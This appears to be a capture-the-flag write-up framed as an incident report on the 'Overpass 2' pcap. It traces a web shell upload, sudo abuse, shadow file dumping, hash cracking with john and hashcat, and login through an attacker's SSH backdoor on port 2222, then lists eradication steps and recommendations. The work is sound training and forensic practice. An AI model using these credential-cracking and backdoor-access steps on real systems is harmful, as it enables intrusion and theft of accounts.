Incident Analysis & Remediation Report: Overpass 2 – Hacked
===========================================================
An analysis of a network packet capture (.pcap) revealed that the host 192.168.170.159 was compromised by an attacker originating from 192.168.170.145. The attack involved web application exploitation, privilege escalation, persistent backdoor installation via SSH, and administrative password cracking.

**Technical Breakdown & Timeline**
----------------------------------
Phase 1: Initial Access & Web Shell Deployment
----------------------------------------------
The initial intrusion occurred via an insecure upload mechanism hosted on the target web application.
- Reconnaissance & File Upload: The attacker accessed http://192.168.170.159/development and uploaded a web shell script named upload.php.
- Directory Traversal & Execution: The attacker identified the storage directory at /development/uploads/ and executed the shell via an HTTP request to http://192.168.170.159/development/uploads/upload.php.
- Command & Control (C2): The script opened an interactive reverse shell back to the attacker system (192.168.170.145).

Wireshark Filter Used for Analysis:
```
http.request.method == POST
```
or
```
http
```
<img width="967" height="425" alt="overpass2_0_http" src="https://github.com/user-attachments/assets/560e2e93-9627-44bf-b52d-08ef560dfb70" />

Artifact Extraction: Navigated to File -> Export Objects -> HTTP to isolate and analyze transmitted payloads.

Phase 2: Post-Exploitation & Enumeration
----------------------------------------
Because the initial C2 traffic was transmitted in unencrypted cleartext (TCP), the attacker's commands and system responses were extracted directly from the packet streams.

Executed Commands Matrix
- Packet 71: User context elevation to account james via -> su james.
- Packet 96: Sudo privileges check using -> sudo -l.
- Packet 103: Decoded response payload confirming james has unrestricted sudo privileges:
```
echo "data" | xxd -r -p
```
- Output:
```
Matching Defaults entries for james on overpass-production:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on overpass-production:
    (ALL : ALL) ALL
```
Credential Dumping
- Packets 111 & 114: Shadow file exfiltration using sudo cat /etc/shadow. 

Cracking Extracted Hashes:
```
echo "[value]" | xxd -r -p > hashes.txt

john --format=sha512crypt --wordlist=/usr/share/wordlists/fasttrack.txt hashes.txt
```

Phase 3: Persistence & Reverse Engineering
------------------------------------------
To maintain access, the attacker cloned and deployed a custom SSH backdoor operating on port 2222.

- Packet 120: Downloaded backdoor repository (git clone [https://github.com/NinjaJc01/ssh-backdoor](https://github.com/NinjaJc01/ssh-backdoor)).
- Packets 120–3403: GitHub download stream completion.
- Packet 3419: Navigated to source (cd ssh-backdoor).
- Packets 3436–3454: Configured public/private key pairs and compiled backdoor components.

Backdoor Key Analysis
- Analysis of tcp.stream eq 3 isolated the custom hashed key used to authenticate against the port 2222 backdoor:
```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05
```
Cracking the Backdoor Hash:
```
hashcat -a 0 -m 1710 hash.txt /usr/share/wordlists/rockyou.txt
```

Phase 4: Recovery, Privilege Escalation & Eradication
-----------------------------------------------------
Target Web Access: http://TARGET_IP/

<img width="944" height="363" alt="overpass2_1_hacked" src="https://github.com/user-attachments/assets/c78a7c21-299e-4837-b9e1-dad1324e2cc0" />

Target Access: Authenticated via the backdoor on port 2222:
```
ssh james@Target_ip -p 2222 -oHostKeyAlgorithms=+ssh-rsa
```
<img width="569" height="302" alt="overpass2_1_james" src="https://github.com/user-attachments/assets/e86129d2-b52b-41e3-963a-84b4fc4c8033" />

Privilege Escalation: Located SUID binaries left by the attacker to gain full root access:
```
find / -type f -perm -4000 2>/dev/null
```
Eradication Steps Taken:
- Removed all web shell artifacts and restored legitimate web application source files.
- Changed the password of james
- Removed the malicious SUID binary.
- Blocked access to the persistent port and stopped the backdoor service:
```
iptables -A INPUT -p tcp --dport 2222 -j DROP
```
<img width="934" height="359" alt="overpass2_1_recovered" src="https://github.com/user-attachments/assets/bd7bc748-b5fc-41db-becf-7f7d0b86e53e" />



Recommendatations
-----------------
- Unrestricted File Upload: Enforce strict file extension whitelisting, MIME type validation, and store uploaded files on a dedicated server/bucket with execution permissions disabled (noexec).
- Plaintext Web Traffic: Enforce HTTP Strict Transport Security (HSTS) and mandate TLS (HTTPS) across all web assets to prevent packet sniffing and credential harvest.
- Weak Password Policies:	Enforce robust complexity requirements for user accounts (e.g., james) to protect shadow file hashes against fast offline wordlist attacks (fasttrack.txt/rockyou.txt).
- Overprivileged Sudo Rules:	Restrict sudo access using the Principle of Least Privilege. Avoid setting wildcard (ALL : ALL) ALL rules for standard user accounts.
- Unauthorized Port Listener:	Implement strict network-based and host-based firewall rules (e.g., egress filtering and blocking unauthorized inbound ports like 2222). Deploy File Integrity Monitoring (FIM) to detect unauthorized SUID binaries.
